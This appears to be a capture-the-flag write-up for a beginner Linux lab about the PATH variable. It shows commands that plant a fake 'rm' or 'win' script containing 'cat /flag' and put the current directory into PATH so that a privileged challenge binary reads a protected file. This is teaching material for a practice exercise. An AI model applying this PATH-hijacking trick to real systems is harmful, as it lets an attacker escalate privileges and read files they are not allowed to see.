# The PATH Variable
```
PATH=""
/challenge/run
```

# Setting PATH
```
PATH=/challenge/more_commands
/challenge/run
```

# Adding Commands
Using option 2 to evade inability to read `/flag`. First make a file `win` that runs `cat /flag`, make `win` executable, then append `win` to the `PATH` variable. Finally run `/challenge/run`.
```
echo "cat /flag" > win
chmod +x win
export PATH=$PATH:./
/challenge/run
```

# Hijacking Commands
I have to use the fact that `/challenge/run` is running `rm` to my advantage. I can make my own command `rm` which runs `cat /flag`, and add this directory before the rest in the `PATH` variable. 
```
echo "cat /flag" > rm
chmod +x rm
export PATH=./:$PATH
/challenge/run
```